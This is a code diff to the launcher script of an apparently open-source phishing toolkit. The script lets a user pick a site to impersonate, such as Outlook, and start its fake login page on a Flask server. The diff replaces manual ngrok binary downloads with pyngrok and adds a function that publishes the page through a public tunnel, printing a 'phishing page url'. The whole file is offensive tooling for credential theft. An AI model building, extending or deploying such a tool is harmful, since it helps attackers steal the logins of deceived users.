@@ -79,51 +79,55 @@ def signal_handler(sig, frame):
     exit()
 
 signal.signal(signal.SIGINT, signal_handler)
-
+unix= False
+windows = False
 #### Detects the Operating System
 if platform == "linux" or platform == "linux2" or platform == "darwin":
     from commands import unixCommands as commands
+    unix = True
 elif platform == "win32":
     from commands import windowsCommands as commands
+    windows=True
 else:
     raise LookupError("Unable to detect operating system! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")
 
-#### Ngrok download links (Try to implement all)
-windows64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
-windows64_name = "ngrok-stable-windows-amd64.zip"
-
-windows32 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-386.zip"
-windows32_name = "ngrok-stable-windows-386.zip"
-
-macOS = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip"
-macOs_name = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip"
-
-linux64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
-linux64_name = "ngrok-stable-linux-amd64.zip"
-
-linux32 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
-linux32_name = "ngrok-stable-linux-386.zip"
-
-linuxARM = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"
-linuxARM_name = "ngrok-stable-linux-arm.zip"
-
-linuxARM64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz"
-linuxARM64_name = "ngrok-stable-linux-arm64.tgz"
-
-freeBSD64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-freebsd-amd64.zip"
-freeBSD64_name = "ngrok-stable-freebsd-amd64.zip"
-
-freeBSD64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-freebsd-386.zip"
-freeBSD64_name = "ngrok-stable-freebsd-386.zip"
-
-#### Clears the console and prints the ASCII art
+from pyngrok import ngrok
+def start_ngrok(port):
+    http_tunnel = ngrok.connect(port, "http")
+    print("phishing page url: " , http_tunnel.public_url.replace("http://" , "https://"))
+    
+    ngrok_process = ngrok.get_ngrok_process()
+    try:
+        ngrok_process.proc.wait()
+    except KeyboardInterrupt:
+        ngrok.kill()
 os.system(commands.clear)
 print(utils.color.colorText(ascii))
+print("\n"*2)
+def split_block(lst, se):
+    if not len(lst)%se==0:
+        for i in range(len(lst)):
+            lst.append("arb")
+    sublists=[]
+    to_split = []
+    for i in range(len(lst)+1):
+        if i%se==0:
+            to_split.append(i)
+    for i in range(len(to_split)-1):
+        sublists.append(lst[to_split[i]:to_split[i+1]])
+    final = []
+    for i in sublists:
+        if "arb" in i:
+            while 'arb' in i:
+                i.remove("arb")
+        if not i==[]:
+            final.append(i)
+    return final
+for site in split_block(list(siteLookUp.keys()), 4): 
+    for j in site:
 
-                                    ############################################################# Questions/ Input #############################################################
-#### Prints options
-for site in siteLookUp:
-    print('\n' + Fore.RED + "[" + Fore.CYAN + str(site) + Fore.RED + "]" + Fore.BLUE + f" {siteLookUp[site]}")
+        print(Fore.RED + "[" + Fore.CYAN + str(j) + Fore.RED + "]" + Fore.BLUE + f" {siteLookUp[j]}" , end="    ")
+    print("\n"*2)
 
 #### Selects the site to create a phishing page for (currently Outlook)
 site = int(input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Choose an option: ") or 1)
@@ -138,12 +142,15 @@ host = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + 
 port = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Flask server port" + Fore.YELLOW + " (49467)" + Fore.GREEN + ": ") or 49467
 
 #### Determines to use ngrok or not
-ngrok = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Use ngrok?" + Fore.YELLOW + " (y/n)" + Fore.GREEN + ": ") or "n"
+ngrok_use = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Use ngrok?" + Fore.YELLOW + " (y/n)" + Fore.GREEN + ": ") or "n"
 
                                      ############################################################# Execution #############################################################
 
 #### 
+import time
 def exec(site):
+    time.sleep(2)
+    print("\n"*2)
     try:
         siteName = siteLookUp[site]
     except KeyError:
@@ -152,68 +159,16 @@ def exec(site):
     path = os.path.join('Sites', siteName, "app.py") #Using this instead of a string to be more portable and possibly prevent issues
 #### Detects the site chosen to create a phishing page for and executes app.py
 # Possibly needing error handling over here
-    os.system(f"{commands.clear} && python {path} {redirect_url} {host} {port}")
+    if windows==True:
+        python_cmd  = "python"
+    else:
+        python_cmd = "python3"
+    os.system(f"{python_cmd} {path} {redirect_url} {host} {port} {siteName}")
 
 
-#### Deploys/starts the server
-if ngrok == "y":
-    if platform == "win32":
-        if system("ngrok > NUL") == 0:
-            Thread(target=os.system(f"ngrok http {port}"), args=(port,)).start()
-            print("\n\n\n\n\n")
-            Thread(target=exec, args=(site, )).start()                   
-        else:
-            print("Downloading nGrok...")
-            with open(windows64.split('/')[-1], 'wb') as download_ngrok:
-                for progressbar in tqdm(iterable = requests.get(windows64, stream = True).iter_content(chunk_size = 1024), total = int(requests.get(windows64, stream = True).headers['content-length'])/1024, unit = 'KB'):
-                    download_ngrok.write(progressbar)
-            with zipfile.ZipFile(windows64_name,"r") as unzip:
-                unzip.extractall()
-                unzip.close()
-                os.remove(windows64_name)
-                Thread(target=os.system(f"ngrok http {port}"), args=(port,)).start()
-                print("\n\n\n\n\n")
-                Thread(target=exec, args=(site, )).start()                                    
-
-
-    if platform == "linux" or platform == "linux2":
-        if system("ngrok > NUL") == 0:
-            Thread(target=os.system(f"./ngrok http {port}"), args=(port,)).start()
-            print("\n\n\n\n\n")
-            Thread(target=exec, args=(site, )).start()          
-        else:
-            print("Downloading nGrok...")
-            with open(linux64.split('/')[-1], 'wb') as download_ngrok:
-                for progressbar in tqdm(iterable = requests.get(linux64, stream = True).iter_content(chunk_size = 1024), total = int(requests.get(linux64, stream = True).headers['content-length'])/1024, unit = 'KB'):
-                    download_ngrok.write(progressbar)
-            with zipfile.ZipFile(linux64_name,"r") as unzip:
-                unzip.extractall()
-                unzip.close()
-                os.remove(linux64_name)
-                os.chmod('ngrok', os.stat('ngrok').st_mode | stat.S_IEXEC)
-                Thread(target=os.system(f"./ngrok http {port}"), args=(port,)).start()
-                print("\n\n\n\n\n")
-                Thread(target=exec, args=(site, )).start                   
-                
-    if platform == "darwin":
-        if system("ngrok > NUL") == 0:
-            Thread(target=os.system(f"./ngrok http {port}"), args=(port,)).start()
-            Thread(target=exec, args=(site, )).start()
-        else:
-            print("Downloading nGrok...")
-            with open(macOS.split('/')[-1], 'wb') as download_ngrok:
-                for progressbar in tqdm(iterable = requests.get(macOS, stream = True).iter_content(chunk_size = 1024), total = int(requests.get(macOS, stream = True).headers['content-length'])/1024, unit = 'KB'):
-                    download_ngrok.write(progressbar)
-            with zipfile.ZipFile(macOs_name,"r") as unzip:
-                unzip.extractall()
-                unzip.close()
-                os.remove(macOs_name)
-                os.chmod('ngrok', os.stat('ngrok').st_mode | stat.S_IEXEC)
-                Thread(target=os.system(f"./ngrok http {port}"), args=(port,)).start()
-                print("\n\n\n\n\n")
-                Thread(target=exec, args=(site, )).start()                  
-
-else:
-    Thread(target=exec, args=(site, )).start()
-
-                                    ############################################################# END #############################################################
+if ngrok_use=="y":
+    a = Thread(target=exec, args=(site, ))
+    b = Thread(target=start_ngrok, args=(port, ))
+    b.start()
+    print("\n"*2)
+    a.start()
